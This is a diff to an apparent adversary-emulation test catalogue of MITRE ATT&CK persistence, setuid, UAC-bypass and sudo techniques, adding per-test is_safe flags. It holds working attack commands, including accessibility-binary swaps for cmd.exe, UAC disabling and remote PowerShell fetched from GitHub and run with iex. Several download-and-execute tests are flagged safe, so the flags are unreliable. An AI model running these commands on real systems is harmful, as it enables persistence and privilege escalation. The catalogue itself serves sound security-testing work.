@@ -21,6 +21,7 @@
       cleanup: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
       type: powershell
       platform: windows
@@ -28,6 +29,7 @@
       cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
       type: powershell
       platform: windows
@@ -39,6 +41,7 @@
         New-ItemProperty -Path $path -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"
       cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: WMI Invoke-CimMethod Start Process
       type: powershell
       platform: windows
@@ -68,6 +71,7 @@
          Remove-CimSession -CimSession $CimSession
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Adding custom debugger for Windows Error Reporting
       type: cmd
       platform: windows
@@ -75,6 +79,7 @@
       cleanup: reg delete "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Load custom DLL on mstsc execution
       type: cmd
       platform: windows
@@ -82,6 +87,7 @@
       cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Persistence using automatic execution of custom DLL during RDP session
       type: cmd
       platform: windows
@@ -89,6 +95,7 @@
       cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Persistence via ErrorHandler.cmd script execution
       type: powershell
       platform: windows
@@ -98,6 +105,7 @@
       cleanup: Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Persistence using STARTUP-PATH in MS-WORD
       type: cmd
       platform: windows
@@ -105,9 +113,10 @@
       cleanup: reg delete HKCU\Software\Microsoft\Office\16.0\Word\Options /v STARTUP-PATH /f
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546
-  is_safe: false
+  is_safe: true
 - id: T1546.001
   name: Change Default File Association
   description: 'Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File ...'
@@ -125,6 +134,7 @@
       cleanup: assoc  .hta=htafile
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/001
   is_safe: false
@@ -155,6 +165,7 @@
         del %SystemRoot%\System32\evilscreensaver.scr
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/002
   is_safe: false
@@ -199,6 +210,7 @@
         $EventFilterToCleanup | Remove-WmiObject
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
       type: powershell
       platform: windows
@@ -231,6 +243,7 @@
         $EventFilterToCleanup | Remove-WmiObject
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows MOFComp.exe Load MOF File
       type: powershell
       platform: windows
@@ -243,9 +256,10 @@
         $EventConsumerToCleanup | Remove-WmiObject
         $EventFilterToCleanup | Remove-WmiObject
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1546/003
-  is_safe: false
+  is_safe: true
 - id: T1546.004
   name: Unix Shell Configuration Modification
   description: Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>...
@@ -265,6 +279,7 @@
         head -n '-2' ~/.bash_profile > /tmp/T1546.004
         mv /tmp/T1546.004 ~/.bash_profile
       timeout: 60
+      is_safe: true
     - name: Add command to .bash_profile
       type: sh
       platform: linux
@@ -273,6 +288,7 @@
         head -n '-2' ~/.bash_profile > /tmp/T1546.004
         mv /tmp/T1546.004 ~/.bash_profile
       timeout: 60
+      is_safe: true
     - name: Add command to .bashrc
       type: sh
       platform: macos
@@ -281,6 +297,7 @@
         head -n '-2' ~/.bashrc > /tmp/T1546.004
         mv /tmp/T1546.004 ~/.bashrc
       timeout: 60
+      is_safe: true
     - name: Add command to .bashrc
       type: sh
       platform: linux
@@ -289,6 +306,7 @@
         head -n '-2' ~/.bashrc > /tmp/T1546.004
         mv /tmp/T1546.004 ~/.bashrc
       timeout: 60
+      is_safe: true
     - name: Add command to .shrc
       type: sh
       platform: linux
@@ -297,6 +315,7 @@
         head -n '-2' ~/.shrc > /tmp/T1546.004
         mv /tmp/T1546.004 ~/.shrc
       timeout: 60
+      is_safe: true
     - name: Append to the system shell profile
       type: sh
       platform: linux
@@ -304,12 +323,14 @@
       cleanup: sed -i "s/# Atomic Red Team was here! T1546.004//" /etc/profile
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Append commands user shell profile
       type: sh
       platform: linux
       command: echo '# Atomic Red Team was here... T1546.004' >> ~/.profile
       cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" ~/.profile
       timeout: 60
+      is_safe: true
     - name: System shell profile scripts
       type: sh
       platform: linux
@@ -317,6 +338,7 @@
       cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" /etc/profile.d/bash_completion.sh
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create/Append to .bash_logout
       type: bash
       platform: linux
@@ -326,9 +348,10 @@
       cleanup: userdel -fr art
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/004
-  is_safe: false
+  is_safe: true
 - id: T1546.005
   name: Trap
   description: |-
@@ -349,39 +372,45 @@
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Trap EXIT
       type: sh
       platform: linux
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Trap EXIT (freebsd)
       type: sh
       platform: linux
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Trap SIGINT
       type: sh
       platform: macos
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Trap SIGINT
       type: sh
       platform: linux
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Trap SIGINT (freebsd)
       type: sh
       platform: linux
       command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
       cleanup: rm -f /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1546/005
-  is_safe: false
+  is_safe: true
 - id: T1546.007
   name: Netsh Helper DLL
   description: |-
@@ -404,6 +433,7 @@
       cleanup: netsh.exe delete helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/007
   is_safe: false
@@ -449,6 +479,7 @@
         }
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace binary of sticky keys
       type: cmd
       platform: windows
@@ -460,6 +491,7 @@
       cleanup: copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Create Symbolic Link From osk.exe to cmd.exe
       type: cmd
       platform: windows
@@ -481,6 +513,7 @@
         icacls %windir%\system32\osk.exe /grant:r Administrators:RX
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
       type: cmd
       platform: windows
@@ -492,6 +525,7 @@
       cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Auto-start application on user logon
       type: cmd
       platform: windows
@@ -505,6 +539,7 @@
         reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace utilman.exe (Ease of Access Binary) with cmd.exe
       type: cmd
       platform: windows
@@ -516,6 +551,7 @@
       cleanup: copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace Magnify.exe (Magnifier binary) with cmd.exe
       type: cmd
       platform: windows
@@ -527,6 +563,7 @@
       cleanup: copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace Narrator.exe (Narrator binary) with cmd.exe
       type: cmd
       platform: windows
@@ -538,6 +575,7 @@
       cleanup: copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
       type: cmd
       platform: windows
@@ -549,6 +587,7 @@
       cleanup: copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Replace AtBroker.exe (App Switcher binary) with cmd.exe
       type: cmd
       platform: windows
@@ -560,6 +599,7 @@
       cleanup: copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/008
   is_safe: false
@@ -586,6 +626,7 @@
         Remove-Item C:\Users\Public\AtomicTest.txt -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/009
   is_safe: false
@@ -606,6 +647,7 @@
       cleanup: reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/010
   is_safe: false
@@ -626,6 +668,7 @@
       cleanup: sdbinst.exe -u "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: New shim database files created in the default shim database directory
       type: powershell
       platform: windows
@@ -637,6 +680,7 @@
         Remove-Item C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Registry key creation and/or modification events for SDB
       type: powershell
       platform: windows
@@ -648,6 +692,7 @@
         Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/011
   is_safe: false
@@ -671,6 +716,7 @@
       cleanup: reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: IFEO Global Flags
       type: cmd
       platform: windows
@@ -684,6 +730,7 @@
         reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: GlobalFlags in Image File Execution Options
       type: powershell
       platform: windows
@@ -691,6 +738,7 @@
       cleanup: "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"\nRemove-Item $registryPath -force"
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/012
   is_safe: false
@@ -718,9 +766,10 @@
         $oldprofile = cat $profile | Select-Object -skiplast 1
         Set-Content $profile -Value $oldprofile
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1546/013
-  is_safe: false
+  is_safe: true
 - id: T1546.014
   name: Emond
   description: |-
@@ -745,6 +794,7 @@
         sudo rm /private/var/db/emondClients/T1546.014
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1546/014
   is_safe: false
@@ -768,6 +818,7 @@
         Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
       cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Powershell Execute COM Object
       type: powershell
       platform: windows
@@ -777,6 +828,7 @@
         $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
       cleanup: Get-Process -Name "*calc" | Stop-Process
       timeout: 120
+      is_safe: true
     - name: COM Hijacking with RunDLL32 (Local Server Switch)
       type: powershell
       platform: windows
@@ -787,6 +839,7 @@
         Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
       cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: COM hijacking via TreatAs
       type: powershell
       platform: windows
@@ -812,9 +865,10 @@
         reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f
         reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1546/015
-  is_safe: false
+  is_safe: true
 - id: T1548.001
   name: Setuid and Setgid
   description: 'An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the applicat...'
@@ -841,6 +895,7 @@
         sudo rm /tmp/hello.c
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Make and modify binary from C source
       type: sh
       platform: linux
@@ -856,6 +911,7 @@
         sudo rm /tmp/hello.c
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Make and modify binary from C source (freebsd)
       type: sh
       platform: linux
@@ -871,6 +927,7 @@
         rm /tmp/hello.c
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetUID flag on file
       type: sh
       platform: macos
@@ -881,6 +938,7 @@
       cleanup: sudo rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetUID flag on file
       type: sh
       platform: linux
@@ -891,6 +949,7 @@
       cleanup: sudo rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetUID flag on file (freebsd)
       type: sh
       platform: linux
@@ -901,6 +960,7 @@
       cleanup: rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetGID flag on file
       type: sh
       platform: macos
@@ -911,6 +971,7 @@
       cleanup: sudo rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetGID flag on file
       type: sh
       platform: linux
@@ -921,6 +982,7 @@
       cleanup: sudo rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Set a SetGID flag on file (freebsd)
       type: sh
       platform: linux
@@ -931,6 +993,7 @@
       cleanup: rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Make and modify capabilities of a binary
       type: sh
       platform: linux
@@ -944,6 +1007,7 @@
         rm /tmp/cap.c
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Provide the SetUID capability to a file
       type: sh
       platform: linux
@@ -953,19 +1017,22 @@
       cleanup: rm /tmp/evilBinary
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Do reconnaissance for files that have the setuid bit set
       type: sh
       platform: linux
       command: find /usr/bin -perm -4000
       timeout: 60
+      is_safe: true
     - name: Do reconnaissance for files that have the setgid bit set
       type: sh
       platform: linux
       command: find /usr/bin -perm -2000
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1548/001
-  is_safe: false
+  is_safe: true
 - id: T1548.002
   name: Bypass User Account Control
   description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click thr...
@@ -984,6 +1051,7 @@
         cmd.exe /c eventvwr.msc
       cleanup: reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Bypass UAC using Event Viewer (PowerShell)
       type: powershell
       platform: windows
@@ -993,6 +1061,7 @@
         Start-Process "C:\Windows\System32\eventvwr.msc"
       cleanup: Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Bypass UAC using Fodhelper
       type: cmd
       platform: windows
@@ -1002,6 +1071,7 @@
         fodhelper.exe
       cleanup: reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Bypass UAC using Fodhelper - PowerShell
       type: powershell
       platform: windows
@@ -1012,6 +1082,7 @@
         Start-Process "C:\Windows\System32\fodhelper.exe"
       cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Bypass UAC using ComputerDefaults (PowerShell)
       type: powershell
       platform: windows
@@ -1022,6 +1093,7 @@
         Start-Process "C:\Windows\System32\ComputerDefaults.exe"
       cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Bypass UAC by Mocking Trusted Directories
       type: cmd
       platform: windows
@@ -1034,6 +1106,7 @@
         del "c:\testbypass.exe" >nul 2>nul
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Bypass UAC using sdclt DelegateExecute
       type: powershell
       platform: windows
@@ -1044,6 +1117,7 @@
         Start-Sleep -s 3
       cleanup: Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Disable UAC using reg.exe
       type: cmd
       platform: windows
@@ -1051,11 +1125,13 @@
       cleanup: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Bypass UAC using SilentCleanup task
       type: cmd
       platform: windows
       command: '"PathToAtomicsFolder\T1548.002\src\T1548.002.bat"'
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 23
       type: cmd
       platform: windows
@@ -1064,6 +1140,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 31
       type: cmd
       platform: windows
@@ -1072,6 +1149,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 33
       type: cmd
       platform: windows
@@ -1080,6 +1158,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 34
       type: cmd
       platform: windows
@@ -1088,6 +1167,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 39
       type: cmd
       platform: windows
@@ -1096,6 +1176,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 56
       type: cmd
       platform: windows
@@ -1104,6 +1185,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 59
       type: cmd
       platform: windows
@@ -1112,6 +1194,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: UACME Bypass Method 61
       type: cmd
       platform: windows
@@ -1120,6 +1203,7 @@
         powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
         powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: WinPwn - UAC Magic
       type: powershell
       platform: windows
@@ -1127,6 +1211,7 @@
         iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
         UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
       timeout: 120
+      is_safe: true
     - name: WinPwn - UAC Bypass ccmstp technique
       type: powershell
       platform: windows
@@ -1134,6 +1219,7 @@
         iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
         UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
       timeout: 120
+      is_safe: true
     - name: WinPwn - UAC Bypass DiskCleanup technique
       type: powershell
       platform: windows
@@ -1141,11 +1227,13 @@
         iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
         UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
       timeout: 120
+      is_safe: true
     - name: WinPwn - UAC Bypass DccwBypassUAC technique
       type: powershell
       platform: windows
       command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
       timeout: 120
+      is_safe: true
     - name: Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key
       type: powershell
       platform: windows
@@ -1155,6 +1243,7 @@
       cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: UAC Bypass with WSReset Registry Modification
       type: powershell
       platform: windows
@@ -1165,6 +1254,7 @@
         $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
       cleanup: Remove-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Recurse -Force
       timeout: 120
+      is_safe: true
     - name: Disable UAC - Switch to the secure desktop when prompting for elevation via registry key
       type: powershell
       platform: windows
@@ -1172,18 +1262,21 @@
       cleanup: Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Disable UAC notification via registry keys
       type: cmd
       platform: windows
       command: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
       cleanup: reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 0 /f
       timeout: 120
+      is_safe: true
     - name: Disable ConsentPromptBehaviorAdmin via registry keys
       type: cmd
       platform: windows
       command: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
       cleanup: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
       timeout: 120
+      is_safe: true
     - name: UAC bypassed by Utilizing ProgIDs registry.
       type: cmd
       platform: windows
@@ -1198,9 +1291,10 @@
         reg delete "HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command" /ve /f
         reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer" /ve /f
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1548/002
-  is_safe: false
+  is_safe: true
 - id: T1548.003
   name: Sudo and Sudo Caching
   description: |-
@@ -1221,18 +1315,21 @@
       command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Sudo usage
       type: sh
       platform: linux
       command: "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers"
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Sudo usage (freebsd)
       type: sh
       platform: linux
       command: "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers"
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Unlimited sudo cache timeout
       type: sh
       platform: macos
@@ -1241,6 +1338,7 @@
         sudo visudo -c -f /etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Unlimited sudo cache timeout
       type: sh
       platform: linux
@@ -1249,6 +1347,7 @@
         sudo visudo -c -f /etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Unlimited sudo cache timeout (freebsd)
       type: sh
       platform: linux
@@ -1257,6 +1356,7 @@
         sudo visudo -c -f /usr/local/etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Disable tty_tickets for sudo caching
       type: sh
       platform: macos
@@ -1265,6 +1365,7 @@
         sudo visudo -c -f /etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Disable tty_tickets for sudo caching
       type: sh
       platform: linux
@@ -1273,6 +1374,7 @@
         sudo visudo -c -f /etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Disable tty_tickets for sudo caching (freebsd)
       type: sh
       platform: linux
@@ -1281,6 +1383,7 @@
         sudo visudo -c -f /usr/local/etc/sudoers
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1548/003
   is_safe: false
